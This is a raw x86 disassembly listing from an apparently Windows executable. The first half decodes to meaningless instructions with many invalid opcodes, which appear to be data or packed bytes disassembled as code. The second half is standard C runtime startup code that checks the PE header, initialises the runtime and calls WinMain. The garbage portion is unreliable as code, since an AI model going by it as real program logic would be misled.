  422372:	js     0x42238d
  422374:	inc    ebp
  422375:	mov    ds:0x40340c07,eax
  42237a:	inc    ecx
  42237b:	and    eax,0x9ef7ecc6
  422380:	(bad)  
  422381:	jo     0x422372
  422383:	fisttp WORD PTR [eax+0xd5d0123]
  422389:	les    esi,FWORD PTR [eax-0x6d]
  42238c:	call   0x5915:0xd703f2c1
  422393:	sub    ecx,edi
  422395:	inc    ebp
  422396:	sbb    eax,0xdeaed1f9
  42239b:	pop    edx
  42239c:	push   ebp
  42239d:	fucomip st,st(3)
  42239f:	push   edi
  4223a0:	jmp    0x74d2f77a
  4223a5:	lds    eax,FWORD PTR [eax+0x1270d50a]
  4223ab:	sub    al,0x70
  4223ad:	ret    
  4223ae:	pop    eax
  4223af:	pop    ds
  4223b0:	ret    0x42ee
  4223b3:	inc    ebx
  4223b4:	ins    BYTE PTR es:[edi],dx
  4223b5:	dec    eax
  4223b6:	test   eax,0xca9df13d
  4223bb:	xchg   edi,eax
  4223bc:	jle    0x42234a
  4223be:	daa    
  4223bf:	cmp    BYTE PTR [ebx+0x243038ed],cl
  4223c5:	jb     0x422432
  4223c7:	sahf   
  4223c8:	adc    DWORD PTR [edi],ecx
  4223ca:	fld    TBYTE PTR [ebx]
  4223cc:	(bad)  
  4223cd:	add    eax,0x40666a8b
  4223d2:	(bad)  
  4223d3:	stc    
  4223d4:	repz inc ecx
  4223d6:	dec    ecx
  4223d7:	in     eax,dx
  4223d8:	xchg   esi,eax
  4223d9:	retf   0xbe8b
  4223dc:	adc    edx,DWORD PTR ds:0x75ef1a28
  4223e2:	mov    esp,DWORD PTR [edi+0x19]
  4223e5:	xchg   edi,eax
  4223e6:	add    BYTE PTR [ecx],dh
  4223e8:	sbb    cl,BYTE PTR [esi+0x3214605d]
  4223ee:	dec    ebx
  4223ef:	sbb    DWORD PTR ds:0xd403808c,eax
  4223f5:	icebp  
  4223f6:	cmp    DWORD PTR [edx+0x3bda8bad],esi
  4223fc:	push   ebx
  4223fd:	jo     0x422477
  4223ff:	ror    BYTE PTR [esp+edx*2],cl
  422402:	int3   
  422403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422404:	push   ebx
  422405:	cli    
  422406:	xor    edx,DWORD PTR [ebx+0x64]
  422409:	not    BYTE PTR [esi]
  42240b:	sbb    ecx,DWORD PTR [esp+ebp*1]
  42240e:	loop   0x42243b
  422410:	inc    esi
  422411:	pop    esi
  422412:	pop    esi
  422413:	in     al,0xf6
  422415:	(bad)  
  422416:	aad    0xe5
  422418:	xor    ch,al
  42241a:	pop    es
  42241b:	test   DWORD PTR [ebp-0x22a26aff],0xb8b6875
  422425:	mov    esp,0x3b0e6a2e
  42242a:	stc    
  42242b:	sbb    al,0xd4
  42242d:	sbb    eax,0x5ab75d03
  422432:	mov    al,ds:0x57a4f2c4
  422437:	test   DWORD PTR [edx],0x1f9b6889
  42243d:	dec    esp
  42243e:	jbe    0x422403
  422440:	into   
  422441:	(bad)  
  422442:	mov    ebp,DWORD PTR [esi+0x317afe4e]
  422448:	in     al,dx
  422449:	rcl    BYTE PTR [ebx+0x1a],0xc5
  42244d:	xor    eax,0xd483ebe8
  422452:	sub    BYTE PTR [edi+0x187b3853],dh
  422458:	mov    BYTE PTR [eax-0x77],ah
  42245b:	test   DWORD PTR [ecx-0x7d508623],edi
  422461:	mov    dh,0x16
  422463:	adc    ecx,DWORD PTR [esi-0xa]
  422466:	adc    cl,al
  422468:	sbb    DWORD PTR [ecx-0x11],ebx
  42246b:	add    BYTE PTR [edx],0xbe
  42246e:	lea    eax,[ecx+0x4b5c69f2]
  422474:	mov    esi,0xc4701958
  422479:	xor    ecx,edi
  42247b:	pop    edi
  42247c:	dec    eax
  42247d:	add    DWORD PTR [edx-0x6f0ef9b5],edi
  422483:	sahf   
  422484:	lea    esi,[edx]
  422486:	iret   
  422487:	xor    DWORD PTR [ecx-0x9035586],0x40
  42248e:	dec    ebp
  42248f:	int3   
  422490:	pop    es
  422491:	jp     0x422506
  422493:	cmp    esi,DWORD PTR [esi]
  422495:	jae    0x42250a
  422497:	or     al,0x33
  422499:	mov    DWORD PTR [ebx],esi
  42249b:	sub    BYTE PTR [eax+0x4a2bd243],0x90
  4224a2:	mov    eax,DWORD PTR [ecx+0x2c]
  4224a5:	test   eax,0xe5092b38
  4224aa:	(bad)  
  4224ab:	jg     0x422505
  4224ad:	js     0x4224bf
  4224af:	inc    ebx
  4224b0:	adc    al,0x70
  4224b2:	sub    esi,edi
  4224b4:	in     eax,0x24
  4224b6:	jno    0x42246b
  4224b8:	popf   
  4224b9:	mov    BYTE PTR [ecx+esi*8+0x47],dl
  4224bd:	es dec esi
  4224bf:	pop    es
  4224c0:	or     esp,edx
  4224c2:	loop   0x4224e2
  4224c4:	mov    bl,0x61
  4224c6:	xchg   BYTE PTR [ebp+ecx*2+0x15fa918d],dl
  4224cd:	dec    esp
  4224ce:	dec    esi
  4224cf:	xchg   WORD PTR [eax-0x8],ax
  4224d3:	into   
  4224d4:	fs into 
  4224d6:	jbe    0x422472
  4224d8:	cli    
  4224d9:	(bad)  
  4224da:	(bad)  
  4224db:	sbb    esi,DWORD PTR [ebp+0xda44f69]
  4224e1:	test   eax,0x6f6b517
  4224e6:	imul   edi,DWORD PTR [edi],0x1c
  4224e9:	fisttp WORD PTR [ebx+0x26c58794]
  4224ef:	pusha  
  4224f0:	inc    ecx
  4224f1:	mov    eax,ds:0xafae90a8
  4224f6:	pop    ecx
  4224f7:	sbb    eax,0x213b6bb5
  4224fc:	pop    esp
  4224fd:	stc    
  4224fe:	xchg   edx,eax
  4224ff:	push   ss
  422500:	dec    edx
  422501:	test   eax,0x4e90e25d
  422506:	add    DWORD PTR [edx],0x6318ba13
  42250c:	cld    
  42250d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42250e:	call   0xa99d1b99
  422513:	or     BYTE PTR [ecx],dl
  422515:	or     al,0xe1
  422517:	pop    es
  422518:	or     al,BYTE PTR [eax-0x3f]
  42251b:	adc    al,0x6b
  42251d:	aaa    
  42251e:	int    0xdc
  422520:	push   eax
  422521:	xchg   edx,eax
  422522:	stc    
  422523:	sbb    ch,al
  422525:	int    0x90
  422527:	push   0xffffffe8
  422529:	xchg   al,al
  42252b:	stos   DWORD PTR es:[edi],eax
  42252c:	push   eax
  42252d:	mov    dl,0xb6
  42252f:	gs dec edi
  422531:	sbb    DWORD PTR [eax+0x67],ebx
  422534:	inc    edi
  422535:	add    BYTE PTR [eax],ah
  422537:	jle    0x42255c
  422539:	int    0xfd
  42253b:	dec    edi
  42253c:	mov    es,edi
  42253e:	outs   dx,BYTE PTR ds:[esi]
  42253f:	jle    0x422542
  422541:	ins    DWORD PTR es:[edi],dx
  422542:	jmp    0x422526
  422544:	add    al,0xe9
  422546:	xor    eax,DWORD PTR [esi+eax*1+0x35c55688]
  42254d:	push   ss
  42254e:	xchg   esi,eax
  42254f:	in     eax,dx
  422550:	or     eax,edx
  422552:	xchg   edi,eax
  422553:	repnz sbb BYTE PTR [ecx+0x6c],0x88
  422558:	hlt    
  422559:	pop    ss
  42255a:	imul   edi,eax,0xab83b80
  422560:	inc    ebx
  422561:	sbb    BYTE PTR [edx+0x10e1c004],al
  422567:	jecxz  0x4225b4
  422569:	ficom  DWORD PTR [edi]
  42256b:	or     BYTE PTR [edx+eax*8+0x32],al
  42256f:	out    0x9a,eax
  422571:	scas   eax,DWORD PTR es:[edi]
  422572:	daa    
  422573:	mov    ah,0x13
  422575:	data16 lahf 
  422577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422578:	sbb    eax,0xcfc6532c
  42257d:	dec    ebx
  42257e:	popf   
  42257f:	imul   eax,DWORD PTR [edi+eiz*2+0xc],0x2429557c
  422587:	dec    eax
  422588:	mov    eax,0x76ed6462
  42258d:	sbb    DWORD PTR [ecx+0x57f725e3],0xffffffe6
  422594:	mov    ebp,0xf90c7292
  422599:	push   es
  42259a:	repz xchg ecx,eax
  42259c:	add    al,0xde
  42259e:	push   ebp
  42259f:	or     edi,DWORD PTR [ecx]
  4225a1:	jge    0x4225f0
  4225a3:	jo     0x4225dc
  4225a5:	bound  ebx,QWORD PTR [esi]
  4225a7:	test   eax,0xd99a7a26
  4225ac:	cmp    al,0xa5
  4225ae:	dec    esp
  4225af:	in     al,0x28
  4225b1:	enter  0xb15d,0xdf
  4225b5:	jnp    0x42255a
  4225b7:	mov    ebx,edi
  4225b9:	add    BYTE PTR [esi+0x45b94149],ch
  4225bf:	cmp    BYTE PTR [edi],dh
  4225c1:	pusha  
  4225c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225c3:	out    0x21,eax
  4225c5:	sub    al,dl
  4225c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225c8:	xchg   edi,eax
  4225c9:	shl    dl,cl
  4225cb:	loope  0x4225b5
  4225cd:	cmp    ebx,ebp
  4225cf:	sbb    eax,0x5610b8ef
  4225d4:	mov    ch,0xc1
  4225d6:	fdiv   QWORD PTR [eax]
  4225d8:	add    al,0x93
  4225da:	pop    ds
  4225db:	lods   al,BYTE PTR ds:[esi]
  4225dc:	mov    ebx,0xa0a84bc4
  4225e1:	out    dx,eax
  4225e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225e3:	stos   BYTE PTR es:[edi],al
  4225e4:	push   cs
  4225e5:	cli    
  4225e6:	mov    dl,0x2
  4225e8:	xchg   BYTE PTR [edi],bl
  4225ea:	or     dh,BYTE PTR [ebp+0x6b]
  4225ed:	sub    DWORD PTR [ecx+0x237ebb4a],ecx
  4225f3:	fsubr  QWORD PTR [edx+0x73c17659]
  4225f9:	jnp    0x42267a
  4225fb:	mov    edi,0xf1c15085
  422600:	lock sbb dl,BYTE PTR [esi-0x71ee114e]
  422607:	mov    ds:0x167cf28a,eax
  42260c:	lods   eax,DWORD PTR ds:[esi]
  42260d:	cmp    eax,0xba0ecac6
  422612:	cdq    
  422613:	dec    ecx
  422614:	xchg   ebp,eax
  422615:	inc    si
  422617:	xor    bh,bh
  422619:	jo     0x422654
  42261b:	mov    al,0x80
  42261d:	cmp    eax,0xcbf8bd54
  422622:	adc    BYTE PTR [esi+0x41],dh
  422625:	jo     0x422611
  422627:	mov    ebp,0xafe9371a
  42262c:	daa    
  42262d:	out    dx,eax
  42262e:	add    DWORD PTR ds:0x6b6446c1,edx
  422634:	mov    ebp,0x8631fe4f
  422639:	retf   0x3e14
  42263c:	inc    eax
  42263d:	addr16 and esi,esp
  422640:	pop    esi
  422641:	es ins BYTE PTR es:[edi],dx
  422643:	cmp    BYTE PTR [ebx+0xed2b90e],cl
  422649:	shl    BYTE PTR [ecx+ebp*8-0x2f],cl
  42264d:	mov    ch,0x85
  42264f:	pop    esp
  422650:	mov    bl,0xf1
  422652:	into   
  422653:	mov    esp,0x5d65e9dd
  422658:	sub    al,0xb8
  42265a:	scas   al,BYTE PTR es:[edi]
  42265b:	aas    
  42265c:	jmp    0xd7786d16
  422661:	sub    BYTE PTR [edi+0x38b27888],bl
  422667:	lock repz or bl,BYTE PTR [esi-0x5e34d8d8]
  42266f:	das    
  422670:	adc    edi,DWORD PTR [ebx-0x5207cc23]
  422676:	mov    edi,0x57b2af54
  42267b:	inc    edx
  42267c:	loope  0x4226dc
  42267e:	jnp    0x4226a5
  422680:	scas   al,BYTE PTR es:[edi]
  422681:	pushf  
  422682:	xor    al,BYTE PTR [edx]
  422684:	push   0xfffffff1
  422686:	aad    0x6f
  422688:	xchg   ebp,eax
  422689:	jns    0x42260d
  42268b:	xchg   esi,eax
  42268c:	fwait
  42268d:	in     al,dx
  42268e:	test   BYTE PTR [ebx],al
  422690:	scas   al,BYTE PTR es:[edi]
  422691:	xor    BYTE PTR [edx-0x6f],dl
  422694:	sub    al,0x63
  422696:	stos   DWORD PTR es:[edi],eax
  422697:	and    BYTE PTR [edx+0x691e5ae6],cl
  42269d:	dec    esp
  42269e:	leave  
  42269f:	ja     0x422678
  4226a1:	dec    ebx
  4226a2:	out    dx,eax
  4226a3:	aas    
  4226a4:	out    0xa7,al
  4226a6:	cld    
  4226a7:	mov    edi,0xf34f39f9
  4226ac:	into   
  4226ad:	lods   al,BYTE PTR ds:[esi]
  4226ae:	sbb    edx,eax
  4226b0:	xor    ebx,eax
  4226b2:	xchg   edi,eax
  4226b3:	in     eax,0xcc
  4226b5:	xor    al,0x75
  4226b7:	outs   dx,BYTE PTR ds:[esi]
  4226b8:	pop    edx
  4226b9:	arpl   bx,bx
  4226bb:	sub    BYTE PTR [ebx-0x45a59ab1],al
  4226c1:	mov    esp,0x90889f51
  4226c6:	bound  edi,QWORD PTR [esi+0x7f06131e]
  4226cc:	shr    DWORD PTR [esi],0xdf
  4226cf:	inc    ebx
  4226d0:	loope  0x422740
  4226d2:	cmp    BYTE PTR [edx],ah
  4226d4:	push   cs
  4226d5:	add    ecx,esi
  4226d7:	loop   0x42267d
  4226d9:	mov    al,ds:0x2e09bd93
  4226de:	cmp    al,0x30
  4226e0:	icebp  
  4226e1:	jg     0x4226dc
  4226e3:	mov    ch,0x5a
  4226e5:	hlt    
  4226e6:	out    dx,al
  4226e7:	cmp    BYTE PTR [eax-0x58c2444],dh
  4226ed:	sbb    ebx,DWORD PTR [esi+0x39818748]
  4226f3:	pop    ebx
  4226f4:	call   0xee0:0x2ec0371a
  4226fb:	and    BYTE PTR [esi-0x68],dh
  4226fe:	push   es
  4226ff:	sbb    eax,0x498f9d6e
  422704:	jle    0x422711
  422706:	xchg   edx,eax
  422707:	je     0x4226f1
  422709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42270a:	inc    edx
  42270b:	pusha  
  42270c:	xchg   ecx,eax
  42270d:	cs out dx,al
  42270f:	or     DWORD PTR [edx+eax*1],edi
  422712:	stc    
  422713:	pop    esi
  422714:	out    dx,al
  422715:	mov    WORD PTR [eax+0x54],?
  422718:	pop    edx
  422719:	in     al,dx
  42271a:	pop    ebp
  42271b:	cld    
  42271c:	aaa    
  42271d:	aad    0x70
  42271f:	repz pop ecx
  422721:	adc    BYTE PTR [edi],cl
  422723:	cld    
  422724:	iret   
  422725:	test   BYTE PTR [eax-0x14],bl
  422728:	adc    ecx,DWORD PTR [edx+0xe]
  42272b:	lahf   
  42272c:	push   ss
  42272d:	stos   BYTE PTR es:[edi],al
  42272e:	push   ds
  42272f:	fwait
  422730:	clc    
  422731:	retf   
  422732:	int    0xcc
  422734:	sti    
  422735:	lahf   
  422736:	xchg   ebx,eax
  422737:	icebp  
  422738:	mov    ds:0x72d6f370,eax
  42273d:	sbb    cl,BYTE PTR [edi-0x34]
  422740:	sbb    BYTE PTR [ecx+0x36],0xf1
  422744:	aam    0x6c
  422746:	test   eax,0xaaba30b0
  42274b:	int    0xdb
  42274d:	jno    0x42276d
  42274f:	jg     0x4226ee
  422751:	sbb    dl,cl
  422753:	ret    0x8e45
  422756:	xchg   esp,eax
  422757:	mov    ah,0x12
  422759:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42275a:	in     al,dx
  42275b:	and    bh,dh
  42275d:	pop    ss
  42275e:	inc    ebx
  42275f:	and    al,0x2d
  422761:	mov    al,0x4f
  422763:	imul   esp,DWORD PTR [edi+0x1e4c0e2b],0x7787163e
  42276d:	stos   BYTE PTR es:[edi],al
  42276e:	addr16 xchg ebx,eax
  422770:	lock and bh,BYTE PTR [ebx]
  422773:	aad    0xc
  422775:	mov    al,ds:0xc0f8a77e
  42277a:	sub    DWORD PTR [ebp+0x1],edx
  42277d:	in     al,dx
  42277e:	push   0xa0ba4042
  422783:	xor    ecx,ebp
  422785:	jecxz  0x422754
  422787:	in     eax,0xc5
  422789:	in     al,dx
  42278a:	lock push 0x1a468629
  422790:	sbb    bh,dl
  422792:	inc    ebp
  422793:	sub    BYTE PTR [edi-0x7c367964],0x44
  42279a:	jb     0x4227f2
  42279c:	mov    esi,db5
  42279f:	adc    DWORD PTR [edx],ecx
  4227a1:	imul   edi,DWORD PTR [ecx-0x4c],0x3c93fd90
  4227a8:	shl    DWORD PTR [ecx+edi*1],cl
  4227ab:	out    0x5c,eax
  4227ad:	push   esi
  4227ae:	jg     0x4227cc
  4227b0:	les    ebx,FWORD PTR [edx]
  4227b2:	stos   BYTE PTR es:[edi],al
  4227b3:	jp     0x4227ba
  4227b5:	mov    bl,0x3f
  4227b7:	or     ah,dl
  4227b9:	push   eax
  4227ba:	fs lock jle 0x4227f7
  4227be:	(bad)  
  4227bf:	pop    edi
  4227c0:	mov    ebp,0x5aa49c60
  4227c5:	xor    DWORD PTR ds:0x8a3915cf,0x89f08910
  4227cf:	ins    DWORD PTR es:[edi],dx
  4227d0:	sbb    ah,BYTE PTR [ecx+0x5e]
  4227d3:	inc    eax
  4227d4:	test   DWORD PTR [edi],eax
  4227d6:	jb     0x422758
  4227d8:	and    DWORD PTR [ebx+0x10755743],0xcc3e0db4
  4227e2:	push   ebp
  4227e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227e4:	sbb    eax,0x204f1a23
  4227e9:	inc    esp
  4227ea:	call   0x783e94dd
  4227ef:	adc    al,BYTE PTR [edi-0x10]
  4227f2:	xlat   BYTE PTR ds:[ebx]
  4227f3:	or     ebx,esp
  4227f5:	add    al,0x35
  4227f7:	ins    BYTE PTR es:[edi],dx
  4227f8:	adc    ecx,edi
  4227fa:	mov    ebx,0x59d28ba0
  4227ff:	nop
  422800:	and    esi,DWORD PTR [ebp+0x6828c105]
  422806:	adc    cl,BYTE PTR [ecx-0x63]
  422809:	call   0x9599:0xe55a19a6
  422810:	jmp    0x4227b2
  422812:	in     al,0xc2
  422814:	mov    al,ds:0x4844ed4f
  422819:	test   al,0x36
  42281b:	mov    dl,0x9e
  42281d:	les    ebp,FWORD PTR [ecx-0x35b7b52b]
  422823:	cmp    edx,esi
  422825:	inc    ebx
  422826:	xchg   edi,eax
  422827:	idiv   BYTE PTR [ecx+0x16aeee90]
  42282d:	push   es
  42282e:	mov    ds,WORD PTR [ebp+0x5d]
  422831:	aad    0xeb
  422833:	in     eax,dx
  422834:	popf   
  422835:	adc    dl,BYTE PTR [esi]
  422837:	rcl    esi,1
  422839:	aas    
  42283a:	mov    fs,WORD PTR [eax-0x56885e51]
  422840:	lea    edx,[edx]
  422842:	loop   0x422839
  422844:	repz jne 0x422823
  422847:	cmp    DWORD PTR [edx+0xe],esi
  42284a:	repnz in eax,0x49
  42284d:	shl    DWORD PTR [ecx+0x11],1
  422850:	inc    esi
  422851:	inc    ebp
  422852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422853:	jnp    0x42280a
  422855:	xchg   esp,eax
  422856:	aas    
  422857:	sbb    BYTE PTR [ebx-0x1e47f61],ah
  42285d:	rcr    eax,1
  42285f:	push   edi
  422860:	inc    ebx
  422861:	push   ecx
  422862:	mov    ds:0x65768b88,eax
  422867:	mov    edi,0xb4af7333
  42286c:	pop    eax
  42286d:	daa    
  42286e:	pusha  
  42286f:	jns    0x4227f6
  422871:	or     ebp,DWORD PTR [esi+0x73]
  422874:	jmp    0x422878
  422876:	ficomp WORD PTR [edi+0x369370fb]
  42287c:	fwait
  42287d:	aaa    
  42287e:	or     ecx,DWORD PTR [ebp+0x74]
  422881:	inc    ebx
  422882:	retf   
  422883:	xor    BYTE PTR [esi+eiz*8+0x4b71fd1],ah
  42288a:	fucom  st(4)
  42288c:	mov    cl,0xed
  42288e:	xlat   BYTE PTR ds:[ebx]
  42288f:	(bad)  
  422890:	into   
  422891:	scas   eax,DWORD PTR es:[edi]
  422892:	mov    ecx,DWORD PTR [edi]
  422894:	(bad)  [edx]
  422896:	sar    BYTE PTR [edi+0x5177ce86],1
  42289c:	in     eax,dx
  42289d:	iret   
  42289e:	dec    eax
  42289f:	hlt    
  4228a0:	iret   
  4228a1:	fwait
  4228a2:	cld    
  4228a3:	sbb    al,0x60
  4228a5:	push   esp
  4228a6:	(bad)
  4228a9:	cmp    BYTE PTR [ebp+0x3220fd55],ch
  4228af:	hlt    
  4228b0:	nop
  4228b1:	jno    0x4228eb
  4228b3:	(bad)  
  4228b4:	xchg   esp,eax
  4228b5:	lds    edi,FWORD PTR [eax+eiz*8+0x24065fce]
  4228bc:	sub    bl,al
  4228be:	sub    BYTE PTR [ecx-0x15],0x21
  4228c2:	dec    edi
  4228c3:	jmp    0x422886
  4228c5:	popf   
  4228c6:	ffreep st(2)
  4228c8:	dec    ebx
  4228c9:	fdiv   QWORD PTR [ebx]
  4228cb:	push   ebp
  4228cc:	mov    al,0x74
  4228ce:	icebp  
  4228cf:	fsubr  QWORD PTR [esi+0x47511db9]
  4228d5:	pop    edx
  4228d6:	lahf   
  4228d7:	mov    ebx,0xe272cc9c
  4228dc:	lahf   
  4228dd:	iret   
  4228de:	out    dx,al
  4228df:	mov    ch,BYTE PTR ds:0x5a5f8e39
  4228e5:	test   edx,0x9947f2e2
  4228eb:	shr    BYTE PTR [edi+0x6e],0x9d
  4228ef:	aad    0x4c
  4228f1:	sar    edx,0xcf
  4228f4:	rcl    ebx,0x62
  4228f7:	lea    ebx,[ebp-0x3349b4a9]
  4228fd:	pushf  
  4228fe:	pop    ecx
  4228ff:	cli    
  422900:	push   esp
  422901:	xchg   esi,eax
  422902:	mov    bh,0xf7
  422904:	jmp    0x879d:0x7202f6db
  42290b:	(bad)  
  42290d:	shr    BYTE PTR [ecx],1
  42290f:	pusha  
  422910:	repnz mov dl,BYTE PTR [eax+0x67]
  422914:	fnstenv [ebx]
  422916:	ror    BYTE PTR [ebx+0x10c25de5],0x0
  42291d:	nop
  42291e:	nop
  42291f:	nop
  422920:	cmp    DWORD PTR ds:0x45cabc,0x1
  422927:	jne    0x42292e
  422929:	call   0x422e6c
  42292e:	push   DWORD PTR [esp+0x4]
  422932:	call   0x422cf5
  422937:	push   0xff
  42293c:	call   DWORD PTR ds:0x45c1c0
  422942:	pop    ecx
  422943:	pop    ecx
  422944:	ret    
  422945:	cmp    DWORD PTR ds:0x45cabc,0x1
  42294c:	jne    0x422953
  42294e:	call   0x422e6c
  422953:	push   DWORD PTR [esp+0x4]
  422957:	call   0x422cf5
  42295c:	push   0xff
  422961:	call   0x422b3b
  422966:	pop    ecx
  422967:	pop    ecx
  422968:	ret    
  422969:	push   0x60
  42296b:	push   0x428110
  422970:	call   0x423858
  422975:	mov    edi,0x94
  42297a:	mov    eax,edi
  42297c:	call   0x4238b0
  422981:	mov    DWORD PTR [ebp-0x18],esp
  422984:	mov    esi,esp
  422986:	mov    DWORD PTR [esi],edi
  422988:	push   esi
  422989:	call   DWORD PTR ds:0x428024
  42298f:	mov    ecx,DWORD PTR [esi+0x10]
  422992:	mov    DWORD PTR ds:0x45cac4,ecx
  422998:	mov    eax,DWORD PTR [esi+0x4]
  42299b:	mov    ds:0x45cad0,eax
  4229a0:	mov    edx,DWORD PTR [esi+0x8]
  4229a3:	mov    DWORD PTR ds:0x45cad4,edx
  4229a9:	mov    esi,DWORD PTR [esi+0xc]
  4229ac:	and    esi,0x7fff
  4229b2:	mov    DWORD PTR ds:0x45cac8,esi
  4229b8:	cmp    ecx,0x2
  4229bb:	je     0x4229c9
  4229bd:	or     esi,0x8000
  4229c3:	mov    DWORD PTR ds:0x45cac8,esi
  4229c9:	shl    eax,0x8
  4229cc:	add    eax,edx
  4229ce:	mov    ds:0x45cacc,eax
  4229d3:	xor    esi,esi
  4229d5:	push   esi
  4229d6:	mov    edi,DWORD PTR ds:0x428014
  4229dc:	call   edi
  4229de:	cmp    WORD PTR [eax],0x5a4d
  4229e3:	jne    0x422a04
  4229e5:	mov    ecx,DWORD PTR [eax+0x3c]
  4229e8:	add    ecx,eax
  4229ea:	cmp    DWORD PTR [ecx],0x4550
  4229f0:	jne    0x422a04
  4229f2:	movzx  eax,WORD PTR [ecx+0x18]
  4229f6:	cmp    eax,0x10b
  4229fb:	je     0x422a1c
  4229fd:	cmp    eax,0x20b
  422a02:	je     0x422a09
  422a04:	mov    DWORD PTR [ebp-0x1c],esi
  422a07:	jmp    0x422a30
  422a09:	cmp    DWORD PTR [ecx+0x84],0xe
  422a10:	jbe    0x422a04
  422a12:	xor    eax,eax
  422a14:	cmp    DWORD PTR [ecx+0xf8],esi
  422a1a:	jmp    0x422a2a
  422a1c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a20:	jbe    0x422a04
  422a22:	xor    eax,eax
  422a24:	cmp    DWORD PTR [ecx+0xe8],esi
  422a2a:	setne  al
  422a2d:	mov    DWORD PTR [ebp-0x1c],eax
  422a30:	push   0x1
  422a32:	call   0x423807
  422a37:	pop    ecx
  422a38:	test   eax,eax
  422a3a:	jne    0x422a44
  422a3c:	push   0x1c
  422a3e:	call   0x422945
  422a43:	pop    ecx
  422a44:	call   0x42377e
  422a49:	test   eax,eax
  422a4b:	jne    0x422a55
  422a4d:	push   0x10
  422a4f:	call   0x422945
  422a54:	pop    ecx
  422a55:	call   0x423667
  422a5a:	mov    DWORD PTR [ebp-0x4],esi
  422a5d:	call   0x423469
  422a62:	test   eax,eax
  422a64:	jge    0x422a6e
  422a66:	push   0x1b
  422a68:	call   0x422920
  422a6d:	pop    ecx
  422a6e:	call   DWORD PTR ds:0x428020
  422a74:	mov    ds:0x45d274,eax
  422a79:	call   0x423347
  422a7e:	mov    ds:0x45cab4,eax
  422a83:	call   0x4232a5
  422a88:	test   eax,eax
  422a8a:	jge    0x422a94
  422a8c:	push   0x8
  422a8e:	call   0x422920
  422a93:	pop    ecx
  422a94:	call   0x423072
  422a99:	test   eax,eax
  422a9b:	jge    0x422aa5
  422a9d:	push   0x9
  422a9f:	call   0x422920
  422aa4:	pop    ecx
  422aa5:	call   0x422b7d
  422aaa:	mov    DWORD PTR [ebp-0x20],eax
  422aad:	cmp    eax,esi
  422aaf:	je     0x422ab8
  422ab1:	push   eax
  422ab2:	call   0x422920
  422ab7:	pop    ecx
  422ab8:	mov    DWORD PTR [ebp-0x38],esi
  422abb:	lea    eax,[ebp-0x64]
  422abe:	push   eax
  422abf:	call   DWORD PTR ds:0x42801c
  422ac5:	call   0x423009
  422aca:	mov    DWORD PTR [ebp-0x68],eax
  422acd:	test   BYTE PTR [ebp-0x38],0x1
  422ad1:	je     0x422ad9
  422ad3:	movzx  eax,WORD PTR [ebp-0x34]
  422ad7:	jmp    0x422adc
  422ad9:	push   0xa
  422adb:	pop    eax
  422adc:	push   eax
  422add:	push   DWORD PTR [ebp-0x68]
  422ae0:	push   esi
  422ae1:	push   esi
  422ae2:	call   edi
  422ae4:	push   eax
  422ae5:	call   0x421790
  422aea:	mov    edi,eax
  422aec:	mov    DWORD PTR [ebp-0x6c],edi
  422aef:	cmp    DWORD PTR [ebp-0x1c],esi
  422af2:	jne    0x422afa
  422af4:	push   edi
  422af5:	call   0x422cb5
  422afa:	call   0x422cd7
  422aff:	jmp    0x422b2c
  422b01:	mov    eax,DWORD PTR [ebp-0x14]
  422b04:	mov    ecx,DWORD PTR [eax]
  422b06:	mov    ecx,DWORD PTR [ecx]
  422b08:	mov    DWORD PTR [ebp-0x70],ecx
  422b0b:	push   eax
  422b0c:	push   ecx
  422b0d:	call   0x422ea5
  422b12:	pop    ecx
  422b13:	pop    ecx
  422b14:	ret    
  422b15:	mov    esp,DWORD PTR [ebp-0x18]
  422b18:	mov    edi,DWORD PTR [ebp-0x70]
  422b1b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b1f:	jne    0x422b27
  422b21:	push   edi
  422b22:	call   0x422cc6
  422b27:	call   0x422ce6
  422b2c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b30:	mov    eax,edi
  422b32:	lea    esp,[ebp-0x7c]
  422b35:	call   0x423893
  422b3a:	ret    
  422b3b:	push   0x42812c
  422b40:	call   DWORD PTR ds:0x428014
  422b46:	test   eax,eax
  422b48:	je     0x422b60
  422b4a:	push   0x42811c
  422b4f:	push   eax
  422b50:	call   DWORD PTR ds:0x428018
  422b56:	test   eax,eax
  422b58:	je     0x422b60
  422b5a:	push   DWORD PTR [esp+0x4]
  422b5e:	call   eax
  422b60:	push   DWORD PTR [esp+0x4]
  422b64:	call   DWORD PTR ds:0x428028
  422b6a:	int3   
  422b6b:	push   0x8
  422b6d:	call   0x423a1f
  422b72:	pop    ecx
  422b73:	ret    
  422b74:	push   0x8
  422b76:	call   0x42398b
  422b7b:	pop    ecx
  422b7c:	ret    
  422b7d:	mov    eax,ds:0x45d270
  422b82:	test   eax,eax
  422b84:	je     0x422b88
  422b86:	call   eax
  422b88:	push   esi
  422b89:	push   edi
  422b8a:	mov    ecx,0x42a00c
  422b8f:	mov    edi,0x42a018
  422b94:	xor    eax,eax
  422b96:	cmp    ecx,edi
  422b98:	mov    esi,ecx
  422b9a:	jae    0x422bb3
  422b9c:	test   eax,eax
  422b9e:	jne    0x422bdf
  422ba0:	mov    ecx,DWORD PTR [esi]
  422ba2:	test   ecx,ecx
  422ba4:	je     0x422ba8
  422ba6:	call   ecx
  422ba8:	add    esi,0x4
  422bab:	cmp    esi,edi
  422bad:	jb     0x422b9c
  422baf:	test   eax,eax
  422bb1:	jne    0x422bdf
  422bb3:	push   0x4236ab
  422bb8:	call   0x423b30
  422bbd:	mov    esi,0x42a000
  422bc2:	mov    eax,esi
  422bc4:	mov    edi,0x42a008
  422bc9:	cmp    eax,edi
  422bcb:	pop    ecx
  422bcc:	jae    0x422bdd
  422bce:	mov    eax,DWORD PTR [esi]
  422bd0:	test   eax,eax
  422bd2:	je     0x422bd6
  422bd4:	call   eax
  422bd6:	add    esi,0x4
  422bd9:	cmp    esi,edi
  422bdb:	jb     0x422bce
  422bdd:	xor    eax,eax
  422bdf:	pop    edi
